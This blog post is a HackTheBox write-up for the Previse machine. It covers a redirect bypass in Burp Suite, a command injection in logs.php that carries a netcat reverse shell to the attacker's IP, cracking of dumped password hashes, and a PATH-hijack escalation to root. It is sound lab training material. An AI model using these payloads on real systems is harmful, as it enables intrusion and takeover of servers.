---
draft: false

title: 'HackTheBox — Previse'
date: 2022-02-11

description: 'Comprehensive walkthrough of the retired Previse machine on HackTheBox'
tags: ['ctf']
---

Hello, and thank you for expressing interest in my report on [Previse](https://app.hackthebox.com/machines/Previse), a CTF hosted by Hack the Box. Previse was uploaded by HTB user [m4lwhere](https://app.hackthebox.com/users/107145) 138 days prior to the publication of this report and is currently considered by the HTB community to be easy to intermediate in terms of difficulty.

Previse requires the submission of a USER flag and a SYSTEM flag, and I have described the process I used to capture both in-depth below.

*Feedback? [I can be reached via email](mailto:contact@swlacy.com?subject=Previse%20Report).*

## Enumeration
### Nmap
This is a single-machine CTF, for which HTB has already provided the IP address (**10.10.11.104**), so we can begin with an NMAP scan on the target — taking some inspiration from [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA), executing [`nmap -sC -sV -oA previse 10.10.11.104`](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+previse+10.10.11.104) will hopefully reveal some information of interest.

```
$ nmap -sC -sV -oA previse 10.10.11.104

Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 10.10.11.104
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
| /: 
| PHPSESSID: 
|_ httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
```

As it appears, Previse is listening on port 22 for incoming SSH connections and on port 80 for HTTP requests with an Apache server. Navigating to http://10.10.11.104 redirects to http://10.10.11.104/login.php; here's a screenshot of that page: ![Screenshot of http://10.10.11.104/login.php](/img/previse1.webp)

Good news — a login portal is likely something we can exploit. I tried a few common credential combinations, such as `admin:admin` and `user:password`, but was unable to log in. No matter, however, as the site still may hold useful resources not protected by a credential prompt. To determine whether this is the case, let's use Gobuster.

### Gobuster
`gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php` performs a brute force directory search on Previse to reveal any hidden pages with names found in *directory-list-2.3-medium.txt* and which have file extensions of .html, .txt, or .php. Executing that command took quite some time, and I unfortunately ran into rate-limiting issues — after all, the word list used contains 220560 elements. Eventually, however, Gobuster yielded the following:

```
$ gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://10.10.11.104
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Extensions: html,txt,php
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php (Status: 302) [Size: 2801] [--> login.php]
/download.php (Status: 302) [Size: 0] [--> login.php]
/login.php (Status: 200) [Size: 2224]
/files.php (Status: 302) [Size: 4914] [--> login.php]
/header.php (Status: 200) [Size: 980]
/nav.php (Status: 200) [Size: 1248]
/footer.php (Status: 200) [Size: 217] 
/css (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php (Status: 302) [Size: 2968] [--> login.php]
/js (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php (Status: 302) [Size: 0] [--> login.php]
/accounts.php (Status: 302) [Size: 3994] [--> login.php]
/config.php (Status: 200) [Size: 0]
/logs.php (Status: 302) [Size: 0] [--> login.php]
Progress: 182532 / 882244 (20.69%)

[ERROR] [!] Get "http://10.10.11.104/17878": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] [!] Get "http://10.10.11.104/chatterbox.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] [!] Get "http://10.10.11.104/merchantsolutions.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

^C
```

Unfortunately, the majority of pages found by Gobuster redirect back to login.php page, and the exceptions are not useful in ways I have knowledge of... For example, viewing a global CSS configuration file was permitted sans-login at /css/uikit.min.css. Clearly, this issue calls for a different strategy.

##  MITM Attack — Burp Suite
### Viewing Protected Pages
If attempting to view specific pages leads to redirection back to login.php, perhaps some information may be gleaned from examining the redirect process. Burp Suite's Proxy tool can be used to intercept and modify HTTP requests and responses — a man-in-the-middle (MITM) attack. Browsing to the accounts.php page is one such URL redirected to login.php, as shown by Gobuster: `/accounts.php (Status: 302) [Size: 3994] [--> login.php]`. See below: upon capturing the HTTP traffic of navigation to accounts.php in Burp Suite, we can see that the response for the request `GET /accounts.php HTTP/1.1` is `HTTP/1.1 302 Found`, and not only that, the source of accounts.php has been captured as well. ![Screenshot of accounts.php intercept in Burp Suite](/img/previse2.webp)

Seeing the "ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!" banner is a sure sign of progress. The captured source code, rendered above:
```html
HTTP/1.1 302 Found
Date: Thu, 23 Dec 2021 10:43:36 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 3994
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Previse rocks your socks." />
        <meta name="author" content="m4lwhere" />
        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.webp">
        <link rel="icon" type="image/webp" sizes="32x32" href="/favicon-32x32.webp">
        <link rel="icon" type="image/webp" sizes="16x16" href="/favicon-16x16.webp">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="stylesheet" href="css/uikit.min.css" />
        <script src="js/uikit.min.js"></script>
        <script src="js/uikit-icons.min.js"></script>
   
<title>Previse Create Account</title>
</head>
<body>
    
<nav class="uk-navbar-container" uk-navbar>
    <div class="uk-navbar-center">
        <ul class="uk-navbar-nav">
            <li class="uk-active"><a href="/index.php">Home</a></li>
            <li>
                <a href="accounts.php">ACCOUNTS</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="accounts.php">CREATE ACCOUNT</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="files.php">FILES</a></li>
            <li>
                <a href="status.php">MANAGEMENT MENU</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="status.php">WEBSITE STATUS</a></li>
                        <li><a href="file_logs.php">LOG DATA</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="#" class=".uk-text-uppercase"></span></a></li>
            <li>
                <a href="logout.php">
                    <button class="uk-button uk-button-default uk-button-small">LOG OUT</button>
                </a>
            </li>
        </ul>
    </div>
</nav>

<section class="uk-section uk-section-default">
    <div class="uk-container">
        <h2 class="uk-heading-divider">Add New Account</h2>
        <p>Create new user.</p>
        <p class="uk-alert-danger">ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!</p>
        <p>Usernames and passwords must be between 5 and 32 characters!</p>
    </p>
        <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>
        </form>
    </div>
</section>
            
<div class="uk-position-bottom-center uk-padding-small">
	<a href="https://m4lwhere.org/" target="_blank"><button class="uk-button uk-button-text uk-text-small">Created by m4lwhere</button></a>
</div>
</body>
</html>
```

The HTML above contains some interesting and relevant information:
- "Usernames and passwords must be between 5 and 32 characters"
- The user addition form requires a POST request to accounts.php with the following fields:
	- A username
	- A password
	- A password confirmation
	- A click event on the CREATE USER button

### Generating a Privileged User

Given that criteria, consider the credential set `username123:password123`. We can enter that information into the actual accounts.php page by injecting a false HTTP response code of 200 (OK) [using Burp Suite Proxy](https://onappsec.com/how-to-edit-response-in-burp-proxy/): ![Screenshot of accessing accounts.php via response code inject](/img/previse3.webp)

Navigating to the login portal and submitting `username123:password123` now permits access to any previously restricted credential-pages, as can be seen below, given the example of files.php: ![Screenshot of accessing accounts.php via response code inject](/img/previse4.webp)

## Building Familiarity with Previse
### Exploring the Previse Site
A plethora of interesting material now lies within our grasp — for instance, a full site backup may be downloaded via a link at files.php. Or, perhaps nearly as significant, a log of user activity as related to file downloads may be downloaded at file_logs.php, which looks like so:
```
$ cat previse.log
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1640244467,username,32
1640244685,username,32
1640244690,username,1
1640244699,username,12312421
1640244721,username,4
1640244726,username,5
1640244735,username,6
1640244741,username,24
1640244751,username,23
1640244755,username,25
1640244760,username,26
1640244769,username,32
1640244776,username,33
1640244793,username,24
1640246372,recon_pilot,32
1640247712,recon_pilot,33
1640249049,recon_pilot,32
1640260386,username123,32
```

As a reminder, user `m4lwhere` is the user who created this CTF; I assume all other users are currently active CTF participants. At the bottom, our injected username (`username123`) can be seen. The link to download the site backup is http:/10.10.11.104/download.php?file=32. The log shows various users attempting to download many other files, so I did the same — sadly, as far as I can tell, only file `32` exists.

### Examining the Previse Backup
Returning to the website backup, it seems that the following files are included, consistent with the pages previously found by Gobuster:
```
$ ls
total 60K
-rw-r--r-- 1 slak slak 5.6K Jun 12  2021 accounts.php
-rw-r--r-- 1 slak slak  208 Jun 12  2021 config.php
-rw-r--r-- 1 slak slak 1.6K Jun  9  2021 download.php
-rw-r--r-- 1 slak slak 1.2K Jun 12  2021 file_logs.php
-rw-r--r-- 1 slak slak 6.0K Jun  9  2021 files.php
-rw-r--r-- 1 slak slak  217 Jun  3  2021 footer.php
-rw-r--r-- 1 slak slak 1012 Jun  5  2021 header.php
-rw-r--r-- 1 slak slak  551 Jun  5  2021 index.php
-rw-r--r-- 1 slak slak 2.9K Jun 12  2021 login.php
-rw-r--r-- 1 slak slak  190 Jun  8  2021 logout.php
-rw-r--r-- 1 slak slak 1.2K Jun  9  2021 logs.php
-rw-r--r-- 1 slak slak 1.3K Jun  5  2021 nav.php
-rw-r--r-- 1 slak slak 1.9K Jun  9  2021 status.php
```

The file config.php contains just the information I'd hoped for: plaintext credentials.
```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

It appears that an SQL database is connected to using credential pair `root:mySQL_p@ssw0rd!:)`. This may be our way in, should the database be vulnerable to code injection. The next step, then, requires setting aside my prejudice against PHP, as the other files must be searched for input handling issues. And Indeed, after spending an inordinate amount of time searching for issues within the PHP source of the site, logs.php contains a potentially exploitable PHP `exec()` function... Did I mention my distaste for PHP? Anyway, consider the exec function in question:
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

If we craft a POST request such that the delimiter (`delim`) has an executable statement appended to it, that statement should be executed. For that reason, `exec` is a dangerous PHP function, especially given the lack of input validation present here. Always sanitize input!

## Gaining Shell Access
### Writing a Malicious POST Request
As previously mentioned, if we create a normal post request to file_logs.php as follows, we then only need to append a malicious custom `delim` parameter to the end — one step at a time though.
Consider the following request, captured when submitting a request for log data from file_logs.php: ![Screenshot of obtaining a valid POST request to file_logs.php](/img/previse5.webp)

At the bottom, `delim=comma` can be seen; this can be changed to `delim=comma; <statement>` to execute `<statement>` when the POST request is forwarded. Ideally, a reverse shell may be set up to grant shell access. This, of course, can be difficult to do without knowing what packages are installed on the target.

I have only ever used Netcat with Metasploit modules on old Windows XP machines to create reverse shell access, so hopefully Previse has Netcat installed. A reverse shell using Netcat can be spawned with [`nc 10.10.14.70 1234 -c bash`](https://explainshell.com/explain?cmd=nc+10.10.14.70+1234+-e+-c+bash); so, the full post request can be as follows, given that my IP address is 10.10.14.70:
```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/awebp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.104/file_logs.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=b1hcqu7ulch7gleqm9f5jnapvm
Connection: close

delim=comma; nc 10.10.14.70 1234 -c bash
```

### Connecting with Netcat
Before sending the POST request with the malicious connection request, we must listen for incoming connections on port 1234, as specified, which is done with [`nc -nlp 1234`](https://explainshell.com/explain?cmd=nc+-nlp+1234). After doing so, the post request may be sent... Looks like Previse has Netcat installed after all — basic shell access has been achieved!
```
$ nc -nlp 1234
listening on [any] 1234 ...
connect to [10.10.14.70] from (UNKNOWN) [10.10.11.104] 48236
```

Executing `whoami` yields `www-data`, as expected.

## Searching for USER, SYSTEM Flags
### Connecting to the SQL Database
The primary incentive behind gaining shell access was to connect to the SQL database using the `root:mySQL_p@ssw0rd!:)` credential set found in the site backup under config.php. Let's see if those credentials work as expected:
```
$ mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)
```
```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1434
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.01 sec)

mysql> 
```

### Finding and Cracking Password Hashes from the SQL Database

It seems the credentials do work! That `accounts` table looks pretty interesting. Contents:
```
mysql> select * from accounts;
select * from accounts;
+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  1 | m4lwhere      | <REDACTED>                         | 2021-05-27 18:18:36 |
|  2 | Squid         | <REDACTED>                         | 2021-12-23 05:14:33 |
|  3 | username      | <REDACTED>                         | 2021-12-23 07:08:53 |
|  4 | recon_pilot   | <REDACTED>                         | 2021-12-23 07:58:57 |
|  5 | administrator | <REDACTED>                         | 2021-12-23 08:14:22 |
|  6 | username123   | <REDACTED>                         | 2021-12-23 11:38:07 |
|  7 | nada123       | <REDACTED>                         | 2021-12-23 13:11:39 |
+----+---------------+------------------------------------+---------------------+
7 rows in set (0.00 sec)
```

Very nice! We have all existing usernames and their password hashes for each user of the Previse site — of course, only the `m4lwhere` user is of any interest, as all other usernames are HTB users. *Note that, to preserve the integrity of the CTF, the password hashes have been redacted.* John or Hashcat could be used here — I'll use John, since I'm familiar with it and the GPU in my Parrot machine is far from powerful...

```
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long
Created directory: /home/slak/.john
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

...
```

Lets explore the Previse file system while John is running. Exiting from the SQL database and executing `ls /home` reveals the existence of the `m4lwhere` user's home directory. Pushing further reveals...
```
www-data@previse:/var/www/html$ ls /home/m4lwhere
user.txt
www-data@previse:/var/www/html$ cat /home/m4lwhere/user.txt
cat: /home/m4lwhere/user.txt: Permission denied
```

The USER flag! Too bad it's read-protected. No matter; remember the open port 22 from the enumeration stage? We'll (hopefully) be able to SSH into Previse as `m4lwhere` soon enough. At that point, the permissions on user.txt won't matter.

After some time, the hash was successfully cracked. 

### Obtaining the USER Flag
Let's see if we can use our newfound password to ssh into Previse as user `m4lwhere`.

```
$ ssh m4lwhere@10.10.11.104
The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.
ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts.
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 23 14:08:52 UTC 2021

  System load:  0.0               Processes:           221
  Usage of /:   51.3% of 4.85GB   Users logged in:     1
  Memory usage: 39%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec 23 13:52:12 2021 from 10.10.16.52
m4lwhere@previse:~$ 
```

Success! Now to read the USER flag:
```
m4lwhere@previse:~$ cat user.txt
<REDACTED>
```

HTB accepted the flag, but we're not quite done yet; the SYSTEM flag remains.

### Escalating Privileges
Executing [`sudo -l`](https://explainshell.com/explain?cmd=sudo+-l) reveals that:
```
User m4lwhere may run the following commands on previse:
 (root) /opt/scripts/access_backup.sh
```

Interesting — here is the contents of access_backup.sh:
```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Examining the script, it looks like development negligence turned in my favor. Both the `gzip` and `date` binaries are referenced relatively; therefore, we can edit PATH to point to my own `gzip`/`date` script(s). Consider the following commands, given that I have created a `date` program in `/home/m4lwhere`:
```
m4lwhere@previse:~$ export PATH=:/home/m4lwhere
m4lwhere@previse:~$ /bin/cat date
#!/bin/bash
/bin/su
m4lwhere@previse:~$ /usr/bin/sudo /opt/scripts/access_backup.sh 
root@previse:/home/m4lwhere# 
```

Root access has been granted!

### Obtaining the SYSTEM Flag
All that is left is to print the SYSTEM flag:
```
root@previse:/home/m4lwhere# ls /root
root.txt
root@previse:/home/m4lwhere# cat /root/root.txt
<REDACTED>
```

And there it is — the SYSTEM flag! The flag was accepted by HTB; thus, [Previse is complete](https://www.hackthebox.com/achievement/machine/787255/373).


## Conclusion
This was a very fun CTF overall, which I admit I found challenging despite the low difficulty rating relative to other HTB challenges. I had a lot of fun working on Previse, and it felt noticeably more accessible to me than some other HTB machines I've attempted. I learned a lot and I encourage others interested in red team security activities to give their own best effort toward this challenge... even if they end up with 50+ open browser tabs at the end like I did.

https://www.hackthebox.com/achievement/machine/787255/373

![https://www.hackthebox.com/achievement/machine/787255/373](/img/previse6.webp)